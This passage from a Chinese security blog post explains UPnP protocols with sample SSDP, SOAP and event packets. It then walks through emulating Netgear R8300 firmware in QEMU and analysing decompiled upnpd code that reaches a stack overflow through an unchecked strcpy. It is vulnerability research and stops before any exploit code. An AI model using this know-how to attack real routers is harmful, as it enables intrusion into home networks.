<strong>数据链路层</strong></h6><ul><li><strong>广播和多播</strong>：UPnP 的一些操作，如设备发现和服务发现，使用网络广播和多播技术。广播和多播是数据链路层的一部分，用于在本地网络上快速传播信息。</li></ul><h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><ul><li><strong>应用层</strong>：UPnP 协议本身是在应用层工作，处理设备发现、服务描述和控制。</li><li><strong>传输层</strong>：利用 HTTP 协议进行数据传输和控制。</li><li><strong>网络层</strong>：使用 SSDP 协议进行设备发现。</li><li><strong>数据链路层</strong>：通过广播和多播技术在局域网中传播信息。</li></ul><p>UPnP 协议的设计和实施依赖于这些不同的层次来实现其自动发现和服务配置的功能。</p><h5 id="GENA协议"><a href="#GENA协议" class="headerlink" title="GENA协议"></a>GENA协议</h5><p>通用事件通知架构（Generic Event Notification Architecture：GENA）定义在控制点想要监听设备的某个服务状态变量的状况时，控制点如何传送订阅信息并如何接收这些信息，该协议运用在UPnP工作流程的事件订阅部分。</p><p><strong>借一张图如下：</strong></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/pnp-2.jpg" alt="upnp-2.jpg"></p><p>1、 首先控制点和设备都先获取IP地址后才能进行下一步的工作(DHCP协议)；</p><p>2、 控制点首先要寻找整个网络上的UPnP设备，同时网络上的设备也要宣告自身的存在；</p><p>3、 控制点要取得设备的描述，包括这些设备提供什么样的服务；在控制点发现设备存活后，会立即访问<code>LOCATION</code>字段中的URL获得设备信息。</p><p>4、 控制点发出动作信息给设备；</p><p>5、 控制点监听设备的状态，当状态改变时作出相应的处理动作；</p><h5 id="upnp整体协议及框架"><a href="#upnp整体协议及框架" class="headerlink" title="upnp整体协议及框架"></a>upnp整体协议及框架</h5><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240819211742105.png" alt="image-20240819211742105"></p><h5 id="SSDP协议"><a href="#SSDP协议" class="headerlink" title="SSDP协议"></a>SSDP协议</h5><p>简单服务发现协议（Simple Service Discovery Protocol：SSDP），是内建在HTTPU&#x2F;HTTPMU里，定义如何让网络上有的服务被发现的协议。具体包括控制点如何发现网络上有哪些服务，以及这些服务的资讯，还有控制点本身宣告他提供哪些服务。该协议运用在UPnP工作流程的设备发现部分。</p><h5 id="SOAP协议"><a href="#SOAP协议" class="headerlink" title="SOAP协议"></a>SOAP协议</h5><p>简单对象访问协议（Simple object Access Protocol：SOAP）定义如何使用xml与HTTP来执行远程过程调用（Remote Procedure Call）。包括控制点如何发送命令消息给设备，设备收到命令消息后如何发送响应消息给控制点。该协议运用在UPnP工作流程的设备控制部分。<strong>用来控制UPnP设备的统一消息格式，发送命令消息即可</strong></p><h5 id="upnp数据包示例"><a href="#upnp数据包示例" class="headerlink" title="upnp数据包示例"></a>upnp数据包示例</h5><h6 id="1-SSDP（Simple-Service-Discovery-Protocol）"><a href="#1-SSDP（Simple-Service-Discovery-Protocol）" class="headerlink" title="1. SSDP（Simple Service Discovery Protocol）"></a>1. SSDP（Simple Service Discovery Protocol）</h6><p>SSDP 是 UPnP 中用于设备发现的协议。SSDP 数据包通常使用 UDP 进行广播。下面是一个 SSDP 请求的示例：</p><p><strong>请求示例：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">M</span>-SEARCH * HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">HOST</span>: <span class="hljs-number">239.255.255.250:1900</span><br><span class="hljs-attribute">MAN</span>: <span class="hljs-string">&quot;ssdp:discover&quot;</span><br><span class="hljs-attribute">MX</span>: <span class="hljs-number">3</span><br><span class="hljs-attribute">ST</span>: ssdp:<span class="hljs-literal">all</span><br></code></pre></td></tr></table></figure><ul><li><strong>HOST</strong>: 指定了目标地址和端口。</li><li><strong>MAN</strong>: 表示这是一个发现请求。也经常是ssdp:all</li><li><strong>MX</strong>: 表示响应的最大等待时间（秒）。</li><li><strong>ST</strong>: 表示搜索目标，可以是特定服务或设备类型。</li></ul><p><strong>响应示例：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">CACHE</span>-CONTROL: max-age=<span class="hljs-number">1800</span><br><span class="hljs-attribute">DATE</span>: Sat, <span class="hljs-number">19</span> Aug <span class="hljs-number">2024</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT<br><span class="hljs-attribute">EXT</span>:<br><span class="hljs-attribute">LOCATION</span>: http://<span class="hljs-number">192.168.1.2:5000</span>/description.xml<br><span class="hljs-attribute">SERVER</span>: OS/version UPnP/<span class="hljs-number">1</span>.<span class="hljs-number">0</span> product/version<br><span class="hljs-attribute">ST</span>: urn:schemas-upnp-org:device:MediaRenderer:<span class="hljs-number">1</span><br><span class="hljs-attribute">USN</span>: uuid:<span class="hljs-number">12345678</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">5678</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">123456789</span>abc::urn:schemas-upnp-org:device:MediaRenderer:<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><ul><li><strong>LOCATION</strong>: 提供了设备描述文件的 URL。</li><li><strong>USN</strong>: 唯一服务名称，标识该设备的 UUID 和服务类型。</li></ul><h6 id="2-设备描述"><a href="#2-设备描述" class="headerlink" title="2. 设备描述"></a>2. 设备描述</h6><p>UPnP 设备通常通过 XML 文件描述其服务和功能。设备描述文件可以通过 SSDP 响应中的 LOCATION URL 获取。下面是一个简单的设备描述的示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:schemas-upnp-org:device-1-0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">specVersion</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">major</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">major</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">minor</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">minor</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">specVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">device</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">deviceType</span>&gt;</span>urn:schemas-upnp-org:device:MediaRenderer:1<span class="hljs-tag">&lt;/<span class="hljs-name">deviceType</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">friendlyName</span>&gt;</span>My Media Renderer<span class="hljs-tag">&lt;/<span class="hljs-name">friendlyName</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">manufacturer</span>&gt;</span>My Company<span class="hljs-tag">&lt;/<span class="hljs-name">manufacturer</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">modelName</span>&gt;</span>Renderer Model<span class="hljs-tag">&lt;/<span class="hljs-name">modelName</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">serviceList</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">serviceType</span>&gt;</span>urn:schemas-upnp-org:service:Rendering:1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceType</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">serviceId</span>&gt;</span>urn:upnp-org:serviceId:Rendering<span class="hljs-tag">&lt;/<span class="hljs-name">serviceId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">controlURL</span>&gt;</span>/control<span class="hljs-tag">&lt;/<span class="hljs-name">controlURL</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">eventSubURL</span>&gt;</span>/event<span class="hljs-tag">&lt;/<span class="hljs-name">eventSubURL</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">scpdURL</span>&gt;</span>/scpd.xml<span class="hljs-tag">&lt;/<span class="hljs-name">scpdURL</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">serviceList</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">device</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="3-控制请求"><a href="#3-控制请求" class="headerlink" title="3. 控制请求"></a>3. 控制请求</h6><p>UPnP 设备可以通过 SOAP（Simple Object Access Protocol）进行控制。下面是一个控制请求的示例：</p><p><strong>控制请求示例：</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/control</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">HOST</span><span class="hljs-punctuation">: </span>192.168.1.2:5000<br><span class="hljs-attribute">CONTENT-TYPE</span><span class="hljs-punctuation">: </span>text/xml; charset=&quot;utf-8&quot;<br><span class="hljs-attribute">SOAPACTION</span><span class="hljs-punctuation">: </span>&quot;urn:schemas-upnp-org:service:Rendering:1#SetVolume&quot;<br><span class="hljs-attribute">CONTENT-LENGTH</span><span class="hljs-punctuation">: </span>123<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">s:Envelope</span> <span class="hljs-attr">xmlns:s</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">             <span class="hljs-attr">s:encodingStyle</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">s:Body</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">u:SetVolume</span> <span class="hljs-attr">xmlns:u</span>=<span class="hljs-string">&quot;urn:schemas-upnp-org:service:Rendering:1&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">NewVolume</span>&gt;</span>10<span class="hljs-tag">&lt;/<span class="hljs-name">NewVolume</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">u:SetVolume</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">s:Body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">s:Envelope</span>&gt;</span></span><br></code></pre></td></tr></table></figure><ul><li><strong>SOAPACTION</strong>: 指定要调用的操作。</li><li><strong>NewVolume</strong>: 传递给服务的参数。</li></ul><h6 id="4-事件通知"><a href="#4-事件通知" class="headerlink" title="4. 事件通知"></a>4. 事件通知</h6><p>UPnP 设备可以发布事件通知，告知其他设备其状态变化。下面是一个事件通知的示例：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">NOTIFY</span> <span class="hljs-string">*</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">HOST</span><span class="hljs-punctuation">: </span>239.255.255.250:3702<br><span class="hljs-attribute">NT</span><span class="hljs-punctuation">: </span>upnp:event<br><span class="hljs-attribute">NTS</span><span class="hljs-punctuation">: </span>upnp:propchange<br><span class="hljs-attribute">SID</span><span class="hljs-punctuation">: </span>uuid:12345678-1234-5678-1234-123456789abc<br><span class="hljs-attribute">SEQ</span><span class="hljs-punctuation">: </span>0<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">e:PropertySet</span> <span class="hljs-attr">xmlns:e</span>=<span class="hljs-string">&quot;urn:schemas-upnp-org:event-1-0&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">e:Volume</span>&gt;</span>10<span class="hljs-tag">&lt;/<span class="hljs-name">e:Volume</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">e:PropertySet</span>&gt;</span></span><br></code></pre></td></tr></table></figure><ul><li><strong>NT</strong>: 表示通知类型。</li><li><strong>NTS</strong>: 通知子类型，表示事件类型。</li><li><strong>SID</strong>: 订阅 ID，用于标识订阅的客户端。</li><li><strong>SEQ</strong>: 序列号，每次通知递增。</li></ul><p>UPnP 数据包涉及多个协议和消息格式，包括设备发现、控制和事件通知。通过这些数据包，设备可以在网络中自动发现、控制和交换信息，从而实现无缝连接和互动。</p><h4 id="PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析"><a href="#PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析" class="headerlink" title="PSV-2020-0211 Netgear R8300 UPnP栈溢出漏洞分析"></a>PSV-2020-0211 Netgear R8300 UPnP栈溢出漏洞分析</h4><h5 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h5><p>固件下载地址<a href="https://www.netgear.com/support/product/r8300/">NIGHTHAWK X8 R8300 | AC5000 SMART WIFI ROUTER | NETGEAR SUPPORT</a></p><p>binwalk -Me 正常解包</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820022530260.png" alt="image-20240820022530260"></p><p>这里使用qemu-system模拟</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> tunctl -t tap0 -u `whoami`<br><span class="hljs-attribute">sudo</span> ifconfig tap0 <span class="hljs-number">192.168.2.1</span>/<span class="hljs-number">24</span><br><span class="hljs-attribute">qemu</span>-system-arm -M vexpress-a9 -kernel vmlinuz-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>-<span class="hljs-number">4</span>-vexpress -initrd initrd.img-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>-<span class="hljs-number">4</span>-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append <span class="hljs-string">&quot;root=/dev/mmcblk0p2&quot;</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic<br></code></pre></td></tr></table></figure><p>虚拟机起来以后分配ip</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ifconfig</span> eth0 <span class="hljs-number">192.168.2.2</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>scp传送文件系统</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">scp sq.tar root<span class="hljs-variable">@192</span>.<span class="hljs-number">168.2</span>.<span class="hljs-number">2</span><span class="hljs-symbol">:/</span><br></code></pre></td></tr></table></figure><p>挂载文件夹、chroot切换目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount -t proc /proc ./squashfs-root/proc<br>mount -o <span class="hljs-built_in">bind</span> /dev ./squashfs-root/dev<br></code></pre></td></tr></table></figure><p>执行.&#x2F;usr&#x2F;sbin&#x2F;upnpd没有反应，ida查看二进制发现没有&#x2F;var&#x2F;run&#x2F;这个目录</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820023504678.png" alt="image-20240820023504678"></p><p>创建&#x2F;tmp&#x2F;var&#x2F;run目录，提示缺少&#x2F;dev&#x2F;nvram</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820023548508.png" alt="image-20240820023548508"></p><p>nvram存储了路由器配置信息，仿真中这里出错需要hook劫持一个与nvram相关的动态链接库。</p><p>网上有一个写好的，我们只要把他编译就好了</p><p><a href="https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c">raw.githubusercontent.com&#x2F;therealsaumil&#x2F;custom_nvram&#x2F;master&#x2F;custom_nvram_r6250.c</a></p><p>但是要注意的是ubuntu现在最新的软件包<code>gcc-arm-linux-gnueabi</code>只对应了armv7架构，我无法在源中直接安装好可以编译ARMv5的gcc。</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820024349143.png" alt="image-20240820024349143"></p><p>这里可以使用docker</p><p>github地址：<a href="https://github.com/rootkiter/cross-cpu-compile">https://github.com/rootkiter/cross-cpu-compile</a></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820024556954.png" alt="image-20240820024556954"></p><p>在docker中执行：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@container</span>] # <span class="hljs-regexp">/root/</span>compile_bins<span class="hljs-regexp">/cross-compiler-armv5l/</span>bin<span class="hljs-operator">/</span>armv5l<span class="hljs-operator">-</span>gcc <span class="hljs-operator">-</span><span class="hljs-type">Wall</span> <span class="hljs-operator">-</span>fPIC <span class="hljs-operator">-</span>shared custom_nvram_r6250.c <span class="hljs-operator">-</span>o nvram.so<br></code></pre></td></tr></table></figure><p>然后docker cp把nvram.so取回本机，scp传入qemu-sytem虚拟机。</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820024921534.png" alt="image-20240820024921534"></p><p>加载nvram.so之后继续报错，找不到 <code>dlsym</code> 的符号</p><p>我们在文件系统中寻找dlsym的调用</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820025058755.png" alt="image-20240820025058755"></p><p>libdl.so.0有调用dlsym，所以加载nvram.so的同时加载libdl.so.0即可</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820025241915.png" alt="image-20240820025241915"></p><p>这里又提示没有nvram.ini文件</p><p>我是在网上找的一个配置信息将它写入<code>/tmp/nvram.ini</code>中</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">upnpd_debug_level</span>=<span class="hljs-number">9</span><br><span class="hljs-attr">lan_ipaddr</span>=<span class="hljs-number">192.168</span>.<span class="hljs-number">2.2</span><br><span class="hljs-attr">hwver</span>=R8500<br><span class="hljs-attr">friendly_name</span>=R8300<br><span class="hljs-attr">upnp_enable</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">upnp_turn_on</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">upnp_advert_period</span>=<span class="hljs-number">30</span><br><span class="hljs-attr">upnp_advert_ttl</span>=<span class="hljs-number">4</span><br><span class="hljs-attr">upnp_portmap_entry</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">upnp_duration</span>=<span class="hljs-number">3600</span><br><span class="hljs-attr">upnp_DHCPServerConfigurable</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">wps_is_upnp</span>=<span class="hljs-number">0</span><br><span class="hljs-attr">upnp_sa_uuid</span>=<span class="hljs-number">00000000000000000000</span><br><span class="hljs-attr">lan_hwaddr</span>=AA:BB:CC:DD:EE:FF<br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">LD_PRELOAD</span>=<span class="hljs-string">&quot;/nvram.so /lib/libdl.so.0&quot;</span> /usr/sbin/upnpd<br></code></pre></td></tr></table></figure><p>终于把服务模拟了起来</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240819235241968.png" alt="image-20240819235241968"></p><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>漏洞点在upnpd的sub_1D020()函数内</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">.......<br><span class="hljs-keyword">if</span> ( (((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)readfds.__fds_bits[(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_C4580 &gt;&gt; <span class="hljs-number">5</span>] &gt;&gt; (dword_C4580 &amp; <span class="hljs-number">0x1F</span>)) &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>    &#123;<br>      <span class="hljs-comment">// 将v52数组的第一个元素设置为0</span><br>      v52[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>      <span class="hljs-comment">// 调用recvfrom函数，从dword_C4580对应的套接字接收数据，并将结果赋值给v26</span><br>      v26 = recvfrom(dword_C4580, v52, <span class="hljs-number">0x1FFF</span>u, <span class="hljs-number">0</span>, &amp;v56, v59);<br>      <span class="hljs-comment">// 将v56结构体的sa_data字段的第2个字节到第6个字节的值转换为整数，并将结果赋值给v27</span><br>      v27 = *(_DWORD *)&amp;v56.sa_data[<span class="hljs-number">2</span>];<br>      <span class="hljs-comment">// 将readfds.__fds_bits数组的第(dword_C4580右移5位)个元素的值与1左移(dword_C4580与0x1F进行按位与运算)的结果进行按位取反，并将结果赋值给readfds.__fds_bits数组的第(dword_C4580右移5位)个元素</span><br>      readfds.__fds_bits[(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_C4580 &gt;&gt; <span class="hljs-number">5</span>] &amp;= ~(<span class="hljs-number">1</span> &lt;&lt; (dword_C4580 &amp; <span class="hljs-number">0x1F</span>));<br>      <span class="hljs-comment">// 如果v27不等于0，则说明接收到的数据地址不为0.0.0.0</span><br>      <span class="hljs-keyword">if</span> ( v27 )<br>      &#123;<br>        <span class="hljs-comment">// 如果v26大于0，则说明接收数据成功</span><br>        <span class="hljs-keyword">if</span> ( v26 )<br>        &#123;<br>          <span class="hljs-comment">// 调用inet_ntoa_b函数，将v27的值转换为字符串形式的IP地址，并将结果赋值给v55</span><br>          inet_ntoa_b(v27, (<span class="hljs-type">int</span>)v55);<br>          <span class="hljs-comment">// 将v52数组的第v26个元素设置为0</span><br>          v52[v26] = <span class="hljs-number">0</span>;<br>          <span class="hljs-comment">// 调用acosNvramConfig_match函数，判断&quot;upnp_turn_on&quot;的值是否为&quot;1&quot;，如果结果为true，则调用sub_25E04函数</span><br>          <span class="hljs-keyword">if</span> ( acosNvramConfig_match((<span class="hljs-type">int</span>)<span class="hljs-string">&quot;upnp_turn_on&quot;</span>, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;1&quot;</span>) )<br>            sub_25E04(v52, (<span class="hljs-type">int</span>)v55, (<span class="hljs-type">unsigned</span> __int16)(*(_WORD *)v56.sa_data &lt;&lt; <span class="hljs-number">8</span>) | HIBYTE(*(_WORD *)v56.sa_data));<br>        &#125;<br>        <span class="hljs-comment">// 否则，说明接收数据失败，打印错误信息</span><br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          sub_B814(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;%s(%d):EOF...\n&quot;</span>, <span class="hljs-string">&quot;upnp_main&quot;</span>, <span class="hljs-number">883</span>);<br>        &#125;<br>      &#125;<br>      <span class="hljs-comment">// 否则，说明接收到的数据地址为0.0.0.0，打印错误信息</span><br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        sub_B814(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;%s(%d):Got Error address 0.0.0.0\n&quot;</span>, <span class="hljs-string">&quot;upnp_main&quot;</span>, <span class="hljs-number">877</span>);<br>      &#125;<br>      <span class="hljs-comment">// 继续循环</span><br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>.........<br></code></pre></td></tr></table></figure><p>这个函数负责处理 UPnP 设备的发现和控制。无限循环，它不断地监听 UDP 广播和 HTTP 请求。</p><p>当接收到 UDP 广播时，代码会检查设备是否处于活动状态，并根据配置信息发送响应。当接收到 HTTP 请求时，代码会解析请求并执行相应的操作。</p><p>这段代码首先检查 <code>readfds.__fds_bits</code> 数组中对应 <code>dword_C4580</code> 的位是否被设置。<code>dword_C4580</code> 是一个 UDP 套接字的描述符，<code>readfds</code> 是一个文件描述符集合，用于跟踪哪些文件描述符准备好进行读取操作。</p><p>如果该位被设置，说明 UDP 套接字 <code>dword_C4580</code> 有数据可读。然后代码执行以下操作：</p><ol><li><strong>清空 <code>v52</code> 数组：</strong> 将 <code>v52</code> 数组的第一个元素设置为 0，用于存储接收到的数据。</li><li><strong>接收数据：</strong> 调用 <code>recvfrom</code> 函数从 <code>dword_C4580</code> 套接字接收数据，并将其保存在<code>v52</code>指向的内存空间中。。</li><li><strong>获取源地址：</strong> 从 <code>v56</code> 结构体中提取源地址，并将其存储在 <code>v27</code> 变量中。</li><li><strong>清除 <code>readfds</code> 中的位：</strong> 将 <code>readfds</code> 数组中对应 <code>dword_C4580</code> 的位清除，以表示已经处理了该套接字上的数据。</li><li><strong>处理数据：</strong> 如果源地址不为 0.0.0.0，并且接收数据成功，则调用 <code>inet_ntoa_b</code> 函数将源地址转换为字符串形式的 IP 地址，并将数据存储在 <code>v52</code> 数组中。如果 <code>upnp_turn_on</code> 的值为 “1”，则调用 <code>sub_25E04</code> 函数处理接收到的数据。</li><li><strong>处理错误：</strong> 如果接收数据失败，则打印错误信息。如果源地址为 0.0.0.0，则打印错误信息。</li></ol><p>套接字接收到数据传入了sub_25E04()，传入该函数的第一个参数为<code>v52</code>，即指向接收的<code>socket</code>数据。</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">sub_25E04(v52, (int)v55, (unsigned __int16)<span class="hljs-comment">(*(_WORD *)</span>v56.sa_data &lt;&lt; <span class="hljs-number">8</span>) | HIBYTE<span class="hljs-comment">(*(_WORD *)</span>v56.sa_data))<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure><p> sub_25E04()函数中，<code>a1</code>为传入的socket数据，<code>v38</code>指向栈上的局部缓冲区调用<code>strcpy()</code>进行数据拷贝，由于缺乏长度校验，当构造一个超长的数据包时，拷贝时会出现缓冲区溢出。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 